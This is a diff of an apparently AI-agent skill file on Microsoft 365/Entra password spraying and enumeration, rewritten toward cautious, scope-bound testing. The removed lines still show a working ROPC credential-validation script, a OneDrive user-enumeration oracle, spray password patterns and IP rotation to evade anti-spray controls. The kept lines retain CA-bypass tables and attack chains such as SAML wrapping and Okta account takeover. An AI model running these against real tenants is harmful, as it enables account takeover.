@@ -65,99 +65,41 @@ Key fields in output:
 
 ---
 
-## AADSTS code reference (memorize)
+## Interpret authentication results conservatively
 
-| AADSTS | Meaning | Lockout impact | What to do |
-|---|---|---|---|
-| 50034 | User does not exist | None | Skip; remove from spray list |
-| 50126 | Invalid username/password | +1 attempt counter | User exists — try alternate password later (within cap) |
-| 50053 | Account locked (Smart Lockout) | None (already locked) | Pre-existing → flag to SOC; don't retry |
-| 53003 | CA blocked token issuance | +1 attempt counter | **PASSWORD VALID** — STOP, password is correct |
-| 50076 | MFA required | +1 attempt counter | **PASSWORD VALID** — second factor needed |
-| 50079 | Strong auth required | +1 attempt counter | **PASSWORD VALID** — same as 50076 |
-| 50158 | External auth required | +1 attempt counter | **PASSWORD VALID** — federated MFA |
-| 530003 | Device-state required | +1 attempt counter | **PASSWORD VALID** — needs compliant device |
-| 65001 | Consent required | +1 attempt counter | App-consent issue, not auth |
-| 700016 | App not in tenant | None | User in different tenant — adjust target |
-| 90002 | Tenant does not exist | None | Tenant typo / dead tenant |
+Use Microsoft's current error reference and tenant sign-in logs. `50126` means
+invalid username or password, not confirmed user existence. `53003` records a
+Conditional Access block, not independently a verified password. `53000` is the
+device-compliance code; the former `530003` entry was incorrect. `50053` can
+reflect lockout or malicious-IP protection regardless of password validity.
+MFA or external-challenge responses need correlation with the actual flow and
+authentication details; do not report a credential as confirmed from one code.
+Record correlation/request IDs and timestamps without tokens or passwords.
 
-**Critical insight:** any code in {53003, 50076, 50079, 50158, 530003} means **the password is correct** — Microsoft only returns these AFTER successful credential validation. Document as a confirmed-valid finding even if you can't get a token.
+## Attempt budget and lockout risk
 
----
-
-## Smart Lockout math (the cap discipline)
-
-**Microsoft default policy:**
-- 10 failed sign-ins in 10 minutes → 1-minute lockout
-- 20 failed sign-ins → progressively longer lockouts (exponential backoff)
-- Counter shared across **ALL auth flows** (ROPC + SAML + IMAP + EWS + SMTP + device-code)
-
-**Engagement discipline:**
-- Hard cap: ≤2 password attempts per user **lifetime per engagement** (some engagements: 1)
-- State file with atomic writes — never let two test runs race the counter
-- Kill switch: stop run if more than N LOCKED responses observed (suggests pre-existing attacker activity OR you miscounted; either way pause)
-
-**Mathematical guarantee:** with 1 attempt per user, **you cannot cause Smart Lockout** (1 < 10). Any AADSTS50053 you see is therefore pre-existing → use this for active-attacker detection (see `mid-engagement-ir-detection` skill).
-
----
+Agree an explicit aggregate budget and stop conditions with the tenant owner.
+Microsoft's defaults differ between public and government clouds and can be
+customized. Prior attempts, location counters, on-premises authentication and
+other operators affect outcomes. One attempt can cross an existing threshold;
+there is no mathematical guarantee that this assessment cannot cause lockout.
+Reserve the attempt before sending under a cross-process lock or transactional
+store shared by all operators and flows. Atomic file replacement alone does not
+serialize concurrent read-modify-write. Stop on unexpected blocks and consult
+the SOC; do not rotate IPs to evade a protection or retry ambiguous requests.
 
 ## User enumeration — vectors + hardening status (May 2026)
 
-### ❌ HARDENED (no longer differential)
+### Tenant-specific hypotheses, not current guarantees
 
-```http
-GET /getuserrealm.srf?login=<email>&xml=1
-```
-Returns identical XML for any email matching tenant's owned domain. **Tenant-level only, not user-level.**
-
-```http
-POST /common/GetCredentialType
-{"username":"<email>", "isOtherIdpSupported":true, ...}
-```
-Returns `AADSTS1659001` (missing flowToken) without proper session — can't enumerate.
-
-```http
-GET /autodiscover/autodiscover.json/v1.0/<email>?Protocol=AutodiscoverV1
-```
-Returns identical 200 + same JSON body for any address. Hardened ~2024.
-
-### ✅ STILL WORKS (May 2026 — track shelf life)
-
-**OneDrive personal-site differential:**
-```http
-GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx HTTP/1.1
-Host: <tenant>-my.sharepoint.com
-```
-- **302 → user EXISTS** (auth-required redirect to Authenticate.aspx)
-- **404 → user does NOT exist** (404 FILE NOT FOUND)
-- ZERO authentication attempt → ZERO lockout impact
-- Bonus: `Sprequestduration` header faster (~40ms) for existing users vs ~600ms for non-existent — secondary timing oracle
-
-**Caveats:**
-- Only works if SharePoint is provisioned for the tenant (check msftrecon `SharePoint Detected: Yes`)
-- Microsoft is hardening these endpoints over time — re-verify before relying on it
-- Some users may exist in Entra without OneDrive provisioning (license-dependent) — false negatives possible
-
-**2026-05-17 re-verification (authorized-engagement revalidation):** The OneDrive enum primitive STILL WORKS as of 2026-05-17. Calibration: licensed users return HTTP 200 with ~57KB body; nonexistent users / shared-mailbox accounts return 404 with 0 bytes. The /personal/ root path (without /_layouts/15/onedrive.aspx) returns the same differential.
-
-**Killer use case: license differential = account-class signal.** Cross-reference OneDrive 200/404 with ROPC AADSTS50034/50126:
-
-| OneDrive | ROPC | Classification |
-|---|---|---|
-| 200 | AADSTS50076 (MFA req) or 50126 | **Licensed regular user** (real employee, MFA enforced) |
-| 200 | AADSTS50034 | (shouldn't happen — inconsistency, investigate) |
-| 404 | AADSTS50126 | **Shared mailbox / functional / service account** (no OneDrive license, has password) — historic MFA-exempt class, prime target for password guessing |
-| 404 | AADSTS50034 | Doesn't exist in tenant |
-| 404 | AADSTS50076 | Edge case (functional account WITH MFA enforced — rare) |
-
-The OneDrive-404 + ROPC-50126 combination is **the signal for "functional account that might bypass MFA"** — admins frequently exempt these from CA policies because they're used by automation that can't satisfy MFA. Discovered usefulness on authorized-engagement revalidation: identified `noreply@`, `purchase@`, `accounts@`, `postmaster@`, `transport@` as functional-account candidates (typical for any conglomerate tenant).
-
-**ROPC AADSTS50034 / AADSTS50126 differential:**
-- AADSTS50034 (user not exist) does NOT increment Smart Lockout counter
-- AADSTS50126 (wrong password) DOES increment
-- So a 1-attempt-per-user spray can be used as a coarse user-existence enumerator (each AADSTS50034 = miss, each AADSTS50126 = hit + 1 attempt burned)
-
----
+Realm, credential-type, autodiscover and OneDrive response differences change
+over time and by tenant. Historical upstream observations are not reproduced
+here. Calibrate only with owner-provided existing and nonexistent test identities.
+A OneDrive 404 can mean unprovisioned storage or another routing condition; it
+does not identify a shared mailbox, account license, password or MFA exemption.
+Response timing is noisy. Authentication-based probes consume the same approved
+attempt budget and can trigger controls. Prefer tenant-admin inventory when the
+assessment objective permits it.
 
 ## Conditional Access bypass options (most blocked, document anyway)
 
@@ -174,62 +116,24 @@ The OneDrive-404 + ROPC-50126 combination is **the signal for "functional accoun
 | SAML SSO via different SP | Sometimes | Each enterprise app has its own CA policy; an app with weaker CA = pivot |
 | Geo-bypass via VPN | Sometimes | If "trusted location" CA policy includes corp HQ IPs, use a VPN exit there |
 
-**Key insight from this engagement:** in a tenant with universal CA policy (compliant device + MFA), all the above paths return AADSTS53003 with the same flow. The cred is valid, but unusable from external. **Phishing-completed cookie steal is the only realistic adversary path.** Document this clearly so the client understands the threat model.
-
----
+A blocked flow demonstrates that specific request was denied. It does not
+prove all services are protected, identify the only viable attack path, or
+establish that a credential was correct. Use tenant-side policy and sign-in
+records to delimit the finding. Phishing, token reuse, device enrollment and
+alternate-resource tests each require explicit scope; they are not automatic
+follow-up steps. Basic-auth availability and app client IDs must be verified
+against the current tenant and vendor documentation.
 
 ## ROPC password validation (the canonical test)
 
-**Single-attempt validator pattern (Python):**
-
-```python
-import urllib.request, urllib.parse, ssl, time, json, os
-ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
-ATTEMPT_FILE = "engagement_log/o365_attempts.json"
-HARD_CAP = 1  # or 2 — never higher
-
-def attempt(email, password):
-    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
-    if state.get(email.lower(), 0) >= HARD_CAP:
-        return {"status": "SKIPPED_CAP"}
-    body = urllib.parse.urlencode({
-        "resource": "https://graph.windows.net",
-        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Graph PowerShell
-        "client_info": "1",
-        "grant_type": "password",
-        "username": email,
-        "password": password,
-        "scope": "openid",
-    }).encode()
-    state[email.lower()] = state.get(email.lower(), 0) + 1
-    json.dump(state, open(ATTEMPT_FILE+".tmp", "w"))
-    os.replace(ATTEMPT_FILE+".tmp", ATTEMPT_FILE)  # atomic
-    req = urllib.request.Request(
-        "https://login.microsoftonline.com/common/oauth2/token",
-        data=body, method="POST",
-    )
-    req.add_header("Content-Type", "application/x-www-form-urlencoded")
-    try:
-        r = urllib.request.urlopen(req, context=ctx, timeout=15)
-        body = json.loads(r.read())
-        # PARSE AS JSON — see CRITICAL TRAP below about substring matching
-        if "access_token" in body:    # ← JSON key check, NOT substring
-            return {"status": "VALID", "body": body}
-        return {"status": "STATUS_200_NO_TOKEN", "body": body}
-    except urllib.error.HTTPError as e:
-        msg = e.read().decode(errors="ignore")
-        for code, status in [
-            ("AADSTS50034", "INVALID_USER"),
-            ("AADSTS50126", "INVALID_PW"),
-            ("AADSTS50053", "LOCKED"),
-            ("AADSTS53003", "VALID_CA_BLOCK"),
-            ("AADSTS50076", "VALID_MFA"),
-            ("AADSTS50079", "VALID_MFA"),
-        ]:
-            if code in msg:
-                return {"status": status, "code": code}
-        return {"status": "OTHER", "msg": msg[:200]}
-```
+The previous inline validator disabled TLS verification, used retired Azure AD
+Graph endpoints and a racy attempt file, and returned token bodies. Do not use
+it as an executable validator. Implement only for an explicitly approved test
+identity, registered client, tenant-specific supported endpoint and resource,
+with TLS verification, transactional attempt reservation, bounded timeouts and
+no automatic retries. Retain only sanitized result/correlation metadata; never
+return or log a token/password in report evidence. ROPC cannot satisfy MFA and
+is unsuitable for many federation and passwordless configurations.
 
 ### ⚠ CRITICAL TRAP — AADSTS50076 body contains literal `"access_token"` substring
 
@@ -247,22 +151,17 @@ When CA policy requires MFA and ROPC cannot satisfy it, Entra returns an error b
 
 **The `"access_token"` substring appears inside the CA claims challenge JSON.** A loose substring check `if "access_token" in raw_body:` will false-positive every MFA-blocked attempt as a successful token issuance.
 
-**Always parse JSON, then check `if "access_token" in parsed_dict:`** — never substring-match on OAuth error bodies. This was discovered in the 2026-05-17 authorized-engagement revalidation where a substring check produced 7 false-positive "CA bypasses" on Sway/Yammer/Bookings/Tunnel client_ids that were actually all enforcing MFA correctly.
+**Always parse JSON, then check `if "access_token" in parsed_dict:`** — never substring-match on OAuth error bodies. This is a parsing hazard, not independently reproduced engagement evidence.
 
 The `claims.access_token.capolids` values are tenant-internal Conditional Access policy IDs — useful recon enrichment, but NOT a token. Document them in engagement notes as "CA policy IDs that fired" — they're a defender-side breadcrumb, not an attacker-side win.
 
-**Pace:**
-- **NEVER use concurrency. Single-threaded, serial, paced. This is a hard rule, not a tuning knob.** Entra has an IP-reputation anti-spray layer that is SEPARATE from per-user Smart Lockout. Concurrency — not attempts-per-user — is what trips it. Once tripped it returns `AADSTS50053` (LOCKED) en masse for accounts you hit only once (mathematically impossible to be real per-user locks → they are IP-level rejections), which (a) **contaminates your existence data** — 50053 is now ambiguous and you've burned the 1/user cap so you can't re-test — and (b) **flags your egress IP as a spray source** in the tenant. Observed live on an authorized engagement: switching from serial to 12 threads produced ~183 false `AADSTS50053` in 15s vs. 1 across 454 paced attempts.
-- The earlier "≤30 req/sec is fine" guidance is MISLEADING for a real tenant — read it as "serial with 1.5–3s jitter," never as "parallelize up to 30/s."
-- Per-user: hard cap from state file is the only thing that matters for lockout-causation; serial pacing is what matters for IP reputation.
-- Random jitter (1.5–5s between attempts) for less-machine-like signature.
-- **Kill-switch:** if >~5 `AADSTS50053` appear in a run where your cap is 1/user, STOP — you've either tripped IP anti-spray (your fault, pace down / rotate IP / wait for cooldown) or detected a real external spray (a finding). Either way, pause and diagnose before continuing.
-
----
+Use only the owner-approved serial pace and cumulative budget. A low rate is
+not a guarantee against lockout or detection. Stop and investigate unexpected
+responses rather than tuning around anti-abuse controls.
 
 ## SAML SSO browser flow (for definitive cred validation when CA blocks ROPC)
 
-When ROPC returns AADSTS53003, you've proven the password. To prove it across BOTH auth paths (and capture Microsoft's CA-block page as evidence), walk SAML SSO via Playwright:
+A separate browser login is another authentication attempt, requiring a separate budget reservation and approved test identity. The example is a selector sketch, not a definitive credential verifier:
 
 ```python
 import asyncio
@@ -270,8 +169,8 @@ from playwright.async_api import async_playwright
 
 async def saml_validate(target_sp_url, username, password, screenshot_dir):
     async with async_playwright() as p:
-        browser = await p.chromium.launch(headless=True, args=["--ignore-certificate-errors"])
-        context = await browser.new_context(ignore_https_errors=True)
+        browser = await p.chromium.launch(headless=True)
+        context = await browser.new_context()
         page = await context.new_page()
         # Step 1: navigate to SP
         await page.goto(target_sp_url, wait_until="networkidle", timeout=30000)
@@ -293,56 +192,38 @@ async def saml_validate(target_sp_url, username, password, screenshot_dir):
         # Step 5: capture
         await page.screenshot(path=f"{screenshot_dir}/saml_final.png", full_page=True)
         content = await page.content()
-        cookies = await context.cookies()
         await browser.close()
         # Check outcome
         low = content.lower()
         if "convergedconditionalaccess" in low or "53003" in low:
-            return "CA_BLOCKED"  # cred valid, CA wall
+            return "CA_BLOCKED"  # observed policy block only
         elif "verify your identity" in low or "approve sign in" in low:
-            return "MFA_REQUIRED"  # cred valid, MFA wall
+            return "MFA_REQUIRED"  # observed challenge only
         elif "we couldn't sign you in" in low or "wrong" in low:
             return "INVALID"
-        elif "<post-auth-landing-marker>" in low or "dashboard" in low:
+        elif "<verified-target-specific-authenticated-marker>" in low:
             return "FULL_SUCCESS"  # session obtained (replace marker per target app)
         return "UNCLEAR"
 ```
 
-Microsoft's `ConvergedConditionalAccess` page (PageID in source) is the definitive evidence of CA-block.
+Validate the final origin, authenticated identity and server-side result. Generic page text can be reflected or stale; screenshots may contain personal data and require private handling.
 
 ---
 
-## Active-attacker detection via lockout differential
+## Lockout investigation and credential handling
 
-If you see `AADSTS50053` (LOCKED) on multiple users despite your 1-attempt-per-user cap:
-1. **You did not cause these locks** (math: 1 < 10).
-2. **An external attacker is actively spraying the tenant.**
-3. **Cluster the locked users alphabetically — if they cluster, attacker is using a sorted username list.**
-4. **Diff lockout count between spray-start and spray-end** — new locks during your session = attacker is active *right now*.
-5. **Document the locked email list as a finding** (SOC actionable — they pull sign-in logs for those users).
-
-This is the **highest-impact byproduct** of any M365 spray engagement. Always track and report.
-
----
-
-## Common password patterns to spray (multi-brand enterprise targets)
-
-- `<BrandName>@<Year>` — `<Brand>@2026`, `Tata@2026`
-- `<BrandName>@123` — `<Brand>@123` (very common)
-- `<PlantCity>@<Year>` — `<City1>@2026`, `<City2>@2026` (production plant cities)
-- `<EmployeeID-as-password>` — common in legacy apps (PAN number, employee code, phone last4)
-- `Password@<year>`, `Welcome@<year>`, `Admin@<year>` — generic defaults
-- `<BrandName>@<Y2-digits>` — `<Brand>@26`
-
-**Engagement caveat:** when client provides leaked-cred dumps (stealer logs), use those FIRST. Each leaked cred is 1 cap-attempt against the strongest known guess for that user.
-
----
+A lockout response alone cannot establish an active attacker or exclude the
+assessment as a contributor. Correlate tenant sign-in logs, failure reasons,
+source addresses, request IDs and prior activity with the SOC. Report a
+hypothesis until corroborated. Never include a real password in a finding.
+Use only owner-supplied dedicated credentials with permission for the exact
+test; stealer-log availability is not authorization to reuse stolen secrets.
 
 ## Engagement journaling (mandatory)
 
 Every M365 attempt logs to JSONL:
 ```json
-{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","pw_first4":"<r4>","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
+{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","credential_ref":"owner-controlled-test-id","status":"CA_BLOCK_OBSERVED","code":"AADSTS53003","attempts_used":1}
 ```
 
 **Per-user tracker** (atomic):
@@ -350,58 +231,23 @@ Every M365 attempt logs to JSONL:
 {"user1@<client>.example": 1, "user2@<client>.example": 1, ...}
 ```
 
-**IP rotation log** (per-day):
-```
-2026-05-08	<src-ip>	<ISP-AS>	<operator-handle>	Round 2 spray
-```
+Log approved egress and operators for correlation, without IP rotation to
+evade protections. Apply a defined retention period; do not automatically carry
+account lists and secrets into later engagements.
 
-These three artifacts are deliverable evidence for the report. They survive into the next engagement as state.
+## Reporting and tooling limits
 
----
-
-## Real-world findings template (from authorized-engagement)
-
-For the report:
-
-**Finding: 261 Entra accounts in pre-existing lockout state**
-- Subject: Active external password-spray campaign detected
-- Evidence: `o365_results.jsonl` filtered to `status=LOCKED`
-- Math: 1-attempt-per-user × 261 LOCKED ≠ our doing
-- SOC action: pull sign-in logs for these 261 accounts over last 30-60 days
-
-**Finding: Valid M365 cred — `<user>:<password>` (CA-blocked)**
-- Subject: Confirmed valid credential
-- Evidence: ROPC AADSTS53003 + SAML SSO `ConvergedConditionalAccess` page screenshot
-- Microsoft documentation excerpt: "AADSTS53003 returned only after password validation"
-- Recommendation: force password reset, audit org-wide for similar pattern
-
----
-
-## Anti-patterns (don't do these)
-
-- **DON'T use the leaked cred for the user across multiple resources** — burns the cap with no marginal benefit when CA blocks all paths
-- **DON'T retry after AADSTS50053** — account is locked, you'll just see lockout again
-- **DON'T parallelize ROPC/auth requests AT ALL** — serial + paced only. Concurrency trips Entra's IP-reputation anti-spray (separate from Smart Lockout), floods false `AADSTS50053`, contaminates results, and flags your IP. "Going faster" by adding threads costs more than it saves. The only safe speed-up is removing dead/nonexistent users first (small `GetCredentialType` batches <60), not raising concurrency.
-- **DON'T forget to test ALL Entra tenants** — sister domains often have separate tenants with different password policies
-- **DON'T retract a CA-block finding** — AADSTS53003 means the password is correct; that's the whole point
-
----
-
-## Tooling
-
-```bash
-pip install --break-system-packages msftrecon o365spray  # may need to clone msftrecon from GitHub
-brew install pandoc                                       # for report generation
-go install -v github.com/projectdiscovery/...             # PD toolkit for general recon
-```
-
-Pre-built `m365_validator.py` template at engagement working directory `engagement_log/m365_validator.py`. Adapt the `attempt()` function to your engagement.
-
----
+Report observed status, tenant/resource, sanitized correlation ID, tested flow,
+known scope and missing corroboration. Do not use historical account counts or
+upstream engagement narratives as current evidence. The external validator path
+is not bundled. Install verified, pinned tools in an isolated environment; do
+not override system Python packaging protections or install broad tool suites
+without need. Do not treat a CA block or OneDrive response as an automatic
+MFA-bypass, compromise or active-attacker finding.
 
 ## Related Skills & Chains
 
-- **`hunt-mfa-bypass`** — AADSTS50053 (lockout) vs AADSTS50126 (bad password) vs AADSTS50076 (MFA required) is a free factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → user has MFA but no CA enforcement on legacy auth → `hunt-mfa-bypass` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
+- **`hunt-mfa-bypass`** — Authentication errors require tenant-log corroboration and are not a reliable factor-presence oracle. Chain primitive: M365 AADSTS50053 lockout differential observed → inspect actual sign-in and policy evidence → `hunt-mfa-bypass` factor-probe (SMS fallback, voice fallback, OAuth device-code flow, ROPC against legacy endpoint) → Conditional Access bypass via legacy-protocol path.
 - **`hunt-ntlm-info`** — On-prem NTLM topology leak feeds the Entra spray. Chain primitive: SharePoint/Exchange/IIS anon NTLM Type-2 → AV_PAIR decode yields `corp.example.com` → `m365-entra-attack` resolves Entra tenant via openid-configuration → ROPC spray with realistic UPN format.
 - **`okta-attack`** — Hybrid orgs run Okta-as-IdP federated into Entra. Chain primitive: M365 `getuserrealm` returns `NameSpaceType: Federated` with AuthURL pointing to `*.okta.com` → pivot to `okta-attack` for tenant enumeration → Okta ATO → SAML assertion to Entra → full M365 access.
 - **`hunt-saml`** — Federated tenants accept signed SAML assertions; XSW or signature-stripping on the federated IdP bypasses Entra's controls entirely. Chain primitive: `getuserrealm` reveals federation → IdP fingerprinted (ADFS / Okta / PingFederate) → `hunt-saml` XSW1-XSW8 against IdP's `/adfs/ls/` or equivalent → forged assertion → Entra grants access.
